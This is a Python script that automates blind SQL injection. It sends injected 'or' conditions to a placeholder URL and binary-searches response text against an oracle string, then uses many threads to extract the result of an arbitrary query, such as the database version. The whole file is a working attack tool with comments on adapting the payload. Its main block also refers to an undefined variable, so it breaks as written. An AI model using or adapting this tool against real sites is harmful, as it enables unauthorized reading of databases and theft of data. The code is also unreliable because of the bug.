import requests                                                
import threading
import time                                               
                                                               
url = "http://url?q=a"

MIN = 0                                                        

# maximum length of the string. go lower if you want
MAX = 1024                                                     

# number of threads to spin
CHUNK_SIZE = 100

# The oracle string in result of the blind sql injection
SUCCESS_STR = "Suggestions"
                                                               
def BlindarySearch(low, high, sql):
    mid = (high + low) // 2                                    

    # Modify injection accordingly
    inj = f"a' or {sql}={mid}; -- - "
  
    q = url + inj                                                               
    r = requests.get(q)                                        
                                                               
    if SUCCESS_STR in r.text:
        return mid                                             

    # Modify injection accordingly
    inj = f"a' or {sql}<{mid}; -- - "                       

    q = url + inj         
    r = requests.get(q)                                        

    if SUCCESS_STR in r.text:
        return BlindarySearch(low, mid-1, sql)
    else:                                                      
        return BlindarySearch(mid+1, high, sql)


def getLength(sql):
    # Getting the length of the result of the blind sql injection
    
    ans = ''
    pos = 1
    newans = ''

    print("Finding Length...")
    length_sql = f"length(({sql}))"
    ans_len = BlindarySearch(MIN, MAX, length_sql)
    print(f"Length: {ans_len}")

    return ans_len


def chunker(seq, size):
    return (seq[pos:pos + size] for pos in range(0, len(seq), size))


def blindCompare(sql, ans_len):
    print(f"Extracting result for \"{sql}\"")

    threads = []

    for pos in range(1,ans_len+1):
        t = threading.Thread(target=getChar, args=(pos,sql))
        threads.append(t)

    print(f"Spawning {ans_len} threads")

    for thread_chunk in chunker(threads, CHUNK_SIZE):
        # Start them all
        for thread in thread_chunk:
            thread.start()
    
        # Wait for all to complete
        for thread in thread_chunk:
            thread.join()


def getChar(pos, sql):
    # if it's SQLite, use unicode() instead
    
    char_sql = f"ascii(substr(({sql}),{pos},1))"
    char = BlindarySearch(32,127,char_sql)
    global answer
    answer[pos-1] = chr(char)
    
    print(f"Done {pos}")


if __name__=='__main__':
    t0 = time.time()
    
    sql = "select @@version"
  
    ans_len = getLength(sql)

    answer = [0] * ans_len

    blindCompare(sql_nowhites, ans_len)

    print(''.join(answer))

    print("done!")
    t1 = time.time()
    total = t1-t0
    print(f"Total time took: {total}s")
